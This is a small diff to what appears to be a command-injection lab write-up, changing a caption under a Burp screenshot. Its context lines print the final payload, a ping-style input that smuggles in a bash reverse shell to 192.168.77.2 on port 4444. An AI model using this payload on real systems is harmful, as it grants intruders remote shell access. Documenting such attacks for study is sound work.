@@ -33,7 +33,7 @@ executor and single quotes wrapping the payload, which properly delimit the `-c`
 argument from the surrounding shell context the app wraps around the input. The final
 payload `127.0.0.1;bash -c ‘bash -i >& /dev/tcp/192.168.77.2/4444 0>&1’`
 
-Burp request and resulting shell connection:
+Burp request edited and sent seen below:
 
 <img width="1708" height="433" alt="image" src="https://github.com/user-attachments/assets/ab92d98c-4e31-46bf-b11b-d28899a52455" />
 
